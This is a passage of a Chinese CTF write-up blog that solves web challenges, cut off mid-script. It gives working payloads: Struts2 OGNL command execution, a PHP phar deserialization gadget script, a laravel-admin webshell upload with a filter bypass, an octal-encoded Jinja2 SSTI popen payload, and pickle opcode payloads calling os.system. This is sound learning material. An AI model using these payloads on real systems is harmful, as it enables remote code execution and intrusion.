id="Mid-🐱-Tomcat-cat"><a href="#Mid-🐱-Tomcat-cat" class="headerlink" title="[Mid] 🐱 Tomcat?cat~"></a>[Mid] 🐱 Tomcat?cat~</h2><p>嘿嘿，这题当时想了好久，后面才发现网页标题有提示<strong>Struct2</strong>，开搜</p><p>但是看了半天其实也没看太懂，这里贴一下别人的原理解释</p><blockquote><p>Struts 2 框架的表单验证机制（ Validation ）主要依赖于两个拦截器：validation 和 workflow。validation 拦截器工作时，会根据 XML 配置文件来创建一个验证错误列表；workflow 拦截器工作时，会根据 validation 拦截器所提供的验证错误列表，来检查当前所提交的表单是否存在验证错误。</p><p>在默认配置下，如果 workflow 拦截器检测到用户所提交的表单存在任何一个验证错误，workflow 拦截器都会将用户的输入进行解析处理，随即返回并显示处理结果。</p><p>Struts 2 框架中的一个标签处理功能： altSyntax</p><p>altSyntax 功能是 Struts 2 框架用于处理标签内容的一种新语法（不同于普通的 HTML ），该功能主要作用在于支持对标签中的 OGNL 表达式进行解析并执行。</p><p>altSyntax 功能在处理标签时，对 OGNL 表达式的解析能力实际上是依赖于开源组件 XWork。</p><p>于是，在 XWork 组件版本小于 2.0.4 以及 altSyntax 功能开启的情况下，恶意攻击者可以通过提交一个带有 OGNL 表达式的表单请求，故意触发表单验证错误——最终该表单请求中恶意的 OGNL 表达式会被 XWork 组件解析并执行，随即由 workflow 拦截器返回执行结果。</p></blockquote><p>再贴一个找到的exp，稍微修改下对应命令就能找到flag了：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">?age=<span class="hljs-meta">%27</span>+<span class="hljs-meta">%2B</span>+<span class="hljs-meta">%28</span><span class="hljs-meta">%23_memberAccess</span><span class="hljs-meta">%5B</span><span class="hljs-meta">%22allowStaticMethodAccess</span><span class="hljs-meta">%22</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3Dtrue</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%23foo</span><span class="hljs-meta">%3Dnew</span>+java<span class="hljs-built_in">.lang</span>.Boolean<span class="hljs-meta">%28</span><span class="hljs-meta">%22false</span><span class="hljs-meta">%22</span><span class="hljs-meta">%29</span>+<span class="hljs-meta">%2C</span><span class="hljs-meta">%23context</span><span class="hljs-meta">%5B</span><span class="hljs-meta">%22xwork</span>.MethodAccessor.denyMethodExecution<span class="hljs-meta">%22</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%23foo</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%40org</span>.apache.commons.io.IOUtils<span class="hljs-meta">%40toString</span><span class="hljs-meta">%28</span><span class="hljs-meta">%40java</span><span class="hljs-built_in">.lang</span>.Runtime<span class="hljs-meta">%40getRuntime</span><span class="hljs-meta">%28</span><span class="hljs-meta">%29</span>.exec<span class="hljs-meta">%28</span><span class="hljs-meta">%27ls</span> webapps/flaaaaaaag<span class="hljs-meta">%27</span><span class="hljs-meta">%29</span>.getInputStream<span class="hljs-meta">%28</span><span class="hljs-meta">%29</span><span class="hljs-meta">%29</span><span class="hljs-meta">%29</span>+<span class="hljs-meta">%2B</span>+<span class="hljs-meta">%27</span><br></code></pre></td></tr></table></figure><p>至于为什么选择age，因为逐个尝试只有他回显了</p><p><em><strong>TODO：才疏学浅，以后有空再来理解一遍</strong></em></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;t0mcat_1s_4_cute_cat_m1a0&#125;</code></font></center></strong></em></p><h2 id="Mid-🔧-where-is-my-unserialize"><a href="#Mid-🔧-where-is-my-unserialize" class="headerlink" title="[Mid] 🔧 where is my unserialize?"></a>[Mid] 🔧 where is my unserialize?</h2><p>这题也磨了好久，访问题目，到处点点</p><p>发现查看文件可以查看源码，那就一个个试下</p><p>index.php:</p><p><img src="/posts/43716/image-20231019005106778.png" alt="image-20231019005106778"></p><p>base.php:<img src="/posts/43716/image-20231019005332254.png" alt="image-20231019005332254"></p><p>upload_file.php:<img src="/posts/43716/image-20231019005437122.png" alt="image-20231019005437122"></p><p>file.php:</p><p><img src="/posts/43716/image-20231019005500258.png" alt="image-20231019005500258"></p><p>function.php:<img src="/posts/43716/image-20231019005529014.png" alt="image-20231019005529014"></p><p>class.php:<img src="/posts/43716/image-20231019005718896.png" alt="image-20231019005718896"></p><p><img src="/posts/43716/image-20231019005731143.png" alt="image-20231019005731143"></p><p><img src="/posts/43716/image-20231019005753405.png" alt="image-20231019005753405"></p><p>有点多。。。</p><p>这也是我之前没见过的题，用到了<strong>phar</strong>，本来想网上找个模板套一下试试，结果成功了</p><p>贴一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CNSS</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shin0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public function __construct($name)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;name=$name;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public function __wakeup()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;shin0 = &#x27;cnss&#x27;;</span><br><span class="hljs-comment">        $this-&gt;_sayhello();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function _sayhello()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        echo (&#x27;&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;&#x27;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public function __destruct()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;shin0 = $this-&gt;name;</span><br><span class="hljs-comment">        echo $this-&gt;shin0.&#x27;&lt;br&gt;&#x27;;</span><br><span class="hljs-comment">    &#125;*/</span><br>&#125;<br><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CN55</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public function __construct()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;params = array();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function __invoke()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        return $this-&gt;_get(&#x27;key&#x27;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function _get($key)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="hljs-comment">            $value = $this-&gt;params[$key];</span><br><span class="hljs-comment">        &#125; else &#123;</span><br><span class="hljs-comment">            $value = &quot;index.php&quot;;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        return $this-&gt;file_get($value);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function file_get($value)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $text = base64_encode(file_get_contents($value));</span><br><span class="hljs-comment">        return $text;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$haha</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    public function __construct($file)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;key = $file;</span><br><span class="hljs-comment">        echo $this-&gt;key.&#x27;&lt;br&gt;&#x27;;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function __toString()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $func = $this-&gt;haha[&#x27;hehe&#x27;];</span><br><span class="hljs-comment">        return $func();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function __call($key,$value)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;$key = $value;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public function _show()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="hljs-comment">            die(&#x27;&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;&#x27;);</span><br><span class="hljs-comment">        &#125; else &#123;</span><br><span class="hljs-comment">            highlight_file($this-&gt;source);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function __wakeup()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;   //Do you know &#x27;Php ARchive&#x27;?</span><br><span class="hljs-comment">            echo &quot;hacker~&quot;;</span><br><span class="hljs-comment">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">*/</span><br>&#125;<br><span class="hljs-variable">$cnss</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CNSS</span>();<br><span class="hljs-variable">$cn55</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CN55</span>();<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$cn55</span>-&gt;params[<span class="hljs-string">&#x27;key&#x27;</span>]=<span class="hljs-string">&#x27;f1ag.php&#x27;</span>;<br><span class="hljs-variable">$cnss</span>-&gt;name = <span class="hljs-variable">$show</span>;<br><span class="hljs-variable">$show</span>-&gt;haha[<span class="hljs-string">&#x27;hehe&#x27;</span>]=<span class="hljs-variable">$cn55</span>;<br><span class="hljs-variable">$phartest</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">phar</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-comment">//开始缓冲 Phar 写操作</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$cnss</span>);<span class="hljs-comment">//自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="hljs-comment">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phartest</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<span class="hljs-comment">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><em><strong>TODO：哭了，当时看的好绕，不是很懂，以后再来看看</strong></em></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;Y0u_Kn0w_PHP_v2ry_we11!!&#125;</code></font></center></strong></em></p><h2 id="Mid-🚓-can-can-need-shell"><a href="#Mid-🚓-can-can-need-shell" class="headerlink" title="[Mid] 🚓 can can need shell"></a>[Mid] 🚓 can can need shell</h2><p>根据hint:</p><p><a href="https://github.com/z-song/laravel-admin/issues/5764">https://github.com/z-song/laravel-admin/issues/5764</a></p><p>可以找到别人对漏洞的复现:</p><p><a href="https://flyd.uk/post/cve-2023-24249/">https://flyd.uk/post/cve-2023-24249/</a></p><p>访问admin目录，<em><strong>admin&#x2F;admin</strong></em>登录</p><p>这个漏洞是<strong>任意文件上传</strong></p><p>具体方法如下：</p><p>把一句话木马写入文件，文件后缀改为<strong>jpg</strong></p><p>使用<strong>BurpSuite</strong>抓包，先不更改，直接放行</p><p>再到http历史记录中找到post记录，并右键进行重放</p><p><img src="/posts/43716/image-20231019011616135.png" alt="image-20231019011616135"></p><p>文件后缀改为php，并发送</p><p><img src="/posts/43716/image-20231019011730708.png" alt="image-20231019011730708"></p><p>漏洞复现成功啦，但是你会发现怎么跟上面文章不一样</p><p>嗯？为什么？究竟为什么？啊啊啊啊，玉玉了</p><p>百思不得其解，但经过后来一通乱点发现了<del>机密</del></p><p>是因为做了过滤</p><p>点击<strong>Media manager</strong></p><p><img src="/posts/43716/image-20231019011953233.png" alt="image-20231019011953233"></p><p>会有一个<strong>FilesystemAdapter.php</strong></p><p>下载来看看<img src="/posts/43716/image-20231019012323953.png" alt="image-20231019012323953"></p><p>发现对后缀以及内容进行了过滤，真是太<strong>罪恶</strong>了😡</p><blockquote><p><em><strong>怎么办，难道就要停滞不前了吗</strong></em></p><p><em><strong>嘿，不要小看羁绊的力量啊！！</strong></em></p></blockquote><p>好吧，其实是等了几天，出题人了加了hint</p><blockquote><p>php关键词列表:<br><a href="https://www.php.net/manual/zh/reserved.keywords.php">https://www.php.net/manual/zh/reserved.keywords.php</a><br>参考这个:<br><a href="https://www.php.net/manual/zh/function.include.php">https://www.php.net/manual/zh/function.include.php</a></p></blockquote><p>一看，师傅好手艺，妙手回春啊，受教了</p><p>waf没有过滤<code>include</code>和引号</p><p>那就上传个一句话木马txt（蚁剑连不上，不造为什么</p><p>再用include包含它，执行就好了，方法跟上面一样</p><p>一通操作直接得到flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;Y0U_H4cked_My_LaRaV31_4dM1n&#125;</code></font></center></strong></em></p><h2 id="Mid-💻-CNSS娘の聊天室"><a href="#Mid-💻-CNSS娘の聊天室" class="headerlink" title="[Mid] 💻 CNSS娘の聊天室"></a>[Mid] 💻 CNSS娘の聊天室</h2><p>这题卡死我了，搜索引擎快被橄榄了呢</p><p>一眼ssti，但是屏蔽了英文字母</p><p>好好好，不会，开搜，经过漫长的搜索，发现可以八进制绕过（🤮</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//payload</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span>&#x27;&#x27;<span class="hljs-punctuation">[</span>&#x27;__class__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;__bases__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;__subclasses__&#x27;<span class="hljs-punctuation">]</span>()<span class="hljs-punctuation">[</span><span class="hljs-number">133</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;__init__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;__globals__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;popen&#x27;<span class="hljs-punctuation">]</span>(<span class="hljs-string">&quot;ls&quot;</span>)<span class="hljs-punctuation">[</span>&#x27;read&#x27;<span class="hljs-punctuation">]</span>()<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span> <br><br><span class="hljs-comment">//转换为8进制</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span>&#x27;&#x27;<span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">143</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">163</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">142</span>\<span class="hljs-number">141</span>\<span class="hljs-number">163</span>\<span class="hljs-number">145</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">163</span>\<span class="hljs-number">165</span>\<span class="hljs-number">142</span>\<span class="hljs-number">143</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">163</span>\<span class="hljs-number">163</span>\<span class="hljs-number">145</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span>()<span class="hljs-punctuation">[</span><span class="hljs-number">133</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">151</span>\<span class="hljs-number">156</span>\<span class="hljs-number">151</span>\<span class="hljs-number">164</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>\<span class="hljs-number">147</span>\<span class="hljs-number">154</span>\<span class="hljs-number">157</span>\<span class="hljs-number">142</span>\<span class="hljs-number">141</span>\<span class="hljs-number">154</span>\<span class="hljs-number">163</span>\<span class="hljs-number">137</span>\<span class="hljs-number">137</span>&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">160</span>\<span class="hljs-number">157</span>\<span class="hljs-number">160</span>\<span class="hljs-number">145</span>\<span class="hljs-number">156</span>&#x27;<span class="hljs-punctuation">]</span>(<span class="hljs-string">&quot;\154\163&quot;</span>)<span class="hljs-punctuation">[</span>&#x27;\<span class="hljs-number">162</span>\<span class="hljs-number">145</span>\<span class="hljs-number">141</span>\<span class="hljs-number">144</span>&#x27;<span class="hljs-punctuation">]</span>()<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span> <br></code></pre></td></tr></table></figure><p><img src="/posts/43716/image-20231019155400087.png" alt="image-20231019155400087"></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;y0u_ru1n3d_my_ch4tr00m!&#125;</code></font></center></strong></em></p><h2 id="Mid-🛒-CNSS娘のFlag商店"><a href="#Mid-🛒-CNSS娘のFlag商店" class="headerlink" title="[Mid] 🛒 CNSS娘のFlag商店"></a>[Mid] 🛒 CNSS娘のFlag商店</h2><p>（其实我觉得这个才应该是Mid+</p><p><strong>&#x2F;code</strong>下载源码</p><p><em><strong>buyInfo.py</strong></em></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">NAME = <span class="hljs-string">&quot;Rich&quot;</span><br>MONEY = <span class="hljs-number">2000</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>():<br>    <span class="hljs-keyword">global</span> NAME, MONEY<br>    NAME = <span class="hljs-string">&quot;Rich&quot;</span><br>    MONEY = <span class="hljs-number">2000</span><br><br></code></pre></td></tr></table></figure></blockquote><p><em><strong>main.py</strong></em></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">import</span> buyInfo<br><span class="hljs-keyword">import</span> flask<br><br>app = flask.Flask(__name__)<br>flag = os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hi</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, money</span>):<br>        self.name = name<br>        self.money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.money == other.money<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user = flask.request.args.get(<span class="hljs-string">&#x27;user&#x27;</span>)<br>    <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;View code in /code to buy flag.&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> user.upper():<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;臭要饭的别挡我财路&#x27;</span><br><br>    user = pickle.loads(user.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(user.name, user.money)<br>    <span class="hljs-built_in">print</span>(buyInfo.NAME,  buyInfo.MONEY)<br>    <span class="hljs-keyword">if</span> user == Hi(buyInfo.NAME,  buyInfo.MONEY):<br>        buyInfo.reset()<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;CNSS娘最喜欢富哥啦，这是你要的flag <span class="hljs-subst">&#123;flag&#125;</span>&#x27;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;臭要饭的别挡我财路&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/code&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">code</span>():<br>    file = <span class="hljs-string">&#x27;code.zip&#x27;</span><br>    <span class="hljs-keyword">return</span> flask.send_file(file, mimetype=<span class="hljs-string">&#x27;application/zip&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8888</span>)<br><br></code></pre></td></tr></table></figure></blockquote><p>根据源码可知要对 <strong>&#x2F;?user</strong> 进行请求</p><p>对<code>R</code>命令进行了过滤，但是我们还有i和从c指令</p><p><strong>R:</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs opcocde">b&#x27;&#x27;&#x27;cos<br>system<br>(S&#x27;whoami&#x27;<br>tR.&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure></blockquote><p><strong>i:</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs opcode">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;<br>ios<br>system<br>.&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure></blockquote><p><strong>o:</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs opcode">b&#x27;&#x27;&#x27;(cos<br>system<br>S&#x27;whoami&#x27;<br>o.&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure></blockquote><p>这里涉及到一个叫<strong>opcode</strong>的东西</p><blockquote><p><em>找到的资料：</em></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p><p><a href="https://xz.aliyun.com/t/7436">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.anquanke.com/post/id/188981%E6%89%BE%E5%88%B0">Python pickle 反序列化实例分析 - 安全客，安全资讯平台 (anquanke.com)</a></p></blockquote><p>一些点：</p><ul><li><p>c指令会自动import库，所以在源代码中不需要引入相关库</p></li><li><p>opcode可以手写，也可以用 <strong><code>pickle.dumps(,protocol=0)</code></strong> 生成，但是使用的pickle版本不能过高，因为高版本有很多不可见字符，不方便编辑（生成的不知道为啥我用了，所以我干脆手写了</p></li><li><blockquote><p>可以使用<strong>pickletools</strong>来调试</p><p><strong>pickletools</strong>是python自带的pickle调试器，有三个功能：</p><ol><li><strong>反汇编</strong>一个已经被打包的字符串</li><li><strong>优化</strong>一个已经被打包的字符串</li><li><strong>返回</strong>一个迭代器来供程序使用</li></ol><p>我们一般使用前两种。详看资料1</p></blockquote></li></ul><p><strong>脚本：</strong></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 